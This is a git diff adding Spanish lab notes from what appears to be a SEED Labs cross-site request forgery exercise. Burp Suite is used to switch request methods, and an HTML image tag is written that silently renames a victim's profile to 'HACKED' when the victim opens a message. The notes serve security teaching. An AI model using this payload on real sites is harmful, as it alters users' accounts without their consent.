@@ -62,3 +62,11 @@ burpsuite &> /dev/null & disown
 - Interceptamos con burpsuite y con click derecho cambiamos a la opción **change request metod** en la información del repeater
 - Hacemos una pequeña verificación de datos borrando los codigos en la primera linea del repeater
 - Damos click en **SEND** y vemos que nos da una repuesta 302 no found
+- Ponemos click en **Follow redirection** y ahora si recargamos de nuevo la pagina debería cambiarse al nombre que ingresamos en el **repeater**
+## Ahora ingresamos con el usuario de samy
+- Vemos que podemos enviar mensajes a los usuarios, lo que haremos es crear una estructura en **HTML** para enviarle Alice para que lo abra y cambiar su nombre 
+- El mensaje seria de la siguiente manera
+```HTML
+<img src="http://www.seed-server.com/action/profile/edit?name=HACKED&description=&accesslevel%5bdescription%5d=2&briefdescription=&accesslevel%5bbriefdescription%5d=2&location=&accesslevel%5blocation%5d=2&interests=&accesslevel%5binterests%5d=2&skills=&accesslevel%5bskills%5d=2&contactemail=&accesslevel%5bcontactemail%5d=2&phone=&accesslevel%5bphone%5d=2&mobile=&accesslevel%5bmobile%5d=2&website=&accesslevel%5bwebsite%5d=2&twitter=&accesslevel%5btwitter%5d=2&guid=56"alt="image"width="1"height="1"/>
+```
+- Enviando esto nos permitiría cambiar el nombre de usuario de la persona que abra el mensaje 
